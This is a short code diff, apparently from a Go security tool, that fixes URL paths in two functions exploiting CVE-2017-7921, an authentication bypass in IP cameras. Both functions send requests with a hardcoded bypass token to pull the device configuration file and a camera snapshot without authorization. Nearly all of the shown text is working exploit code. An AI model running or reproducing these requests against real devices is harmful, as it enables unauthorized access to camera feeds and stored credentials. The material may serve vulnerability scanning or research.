@@ -72,7 +72,7 @@ func FilterStrings(data string) []string {
 }
 
 func CVE_2017_7921_Config(url string, client *http.Client) string {
-	_, body, err := clients.NewSimpleGetRequest(url+"System/configurationFile?auth=YWRtaW46MTEK", client)
+	_, body, err := clients.NewSimpleGetRequest(url+"/System/configurationFile?auth=YWRtaW46MTEK", client)
 	if err != nil {
 		return err.Error()
 	}
@@ -84,7 +84,7 @@ func CVE_2017_7921_Config(url string, client *http.Client) string {
 }
 
 func CVE_2017_7921_Snapshot(url string, client *http.Client) []byte {
-	_, body, err := clients.NewSimpleGetRequest(url+"onvif-http/snapshot?auth=YWRtaW46MTEK", client)
+	_, body, err := clients.NewSimpleGetRequest(url+"/onvif-http/snapshot?auth=YWRtaW46MTEK", client)
 	if err != nil {
 		return []byte{}
 	}
